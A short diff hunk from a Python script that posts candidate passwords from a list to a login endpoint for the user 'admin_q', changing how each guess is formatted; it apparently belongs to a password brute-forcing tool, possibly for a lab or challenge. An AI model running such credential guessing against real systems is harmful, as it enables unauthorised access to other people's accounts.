@@ -10,10 +10,8 @@ def send_password(password_list:list):
          
           payload = {
             "username": "admin_q",
-            "password":str(i)
+            "password":str(''.join(i))
             }
-          
-          
           response = requests.post(HOST_URL,data=payload)
           response.raise_for_status()  # Raise an exception for unsuccessful requests
 
